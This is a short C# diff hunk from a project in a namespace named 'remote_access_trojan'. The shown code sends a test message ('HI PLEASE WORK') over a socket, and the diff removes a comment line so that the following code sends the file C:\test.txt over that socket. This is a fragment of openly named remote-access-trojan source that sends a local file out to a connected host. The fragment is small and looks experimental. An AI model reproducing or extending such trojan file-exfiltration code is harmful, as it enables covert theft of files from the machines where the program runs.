@@ -32,7 +32,6 @@ namespace remote_access_trojan
                 byte[] message = Encoding.UTF8.GetBytes("HI PLEASE WORK");
                 sock.Send(message);
 
-                /////*
                 string fileName = "C:\\test.txt";
                 Console.WriteLine("Sending {0}", fileName);
                 sock.SendFile(fileName);
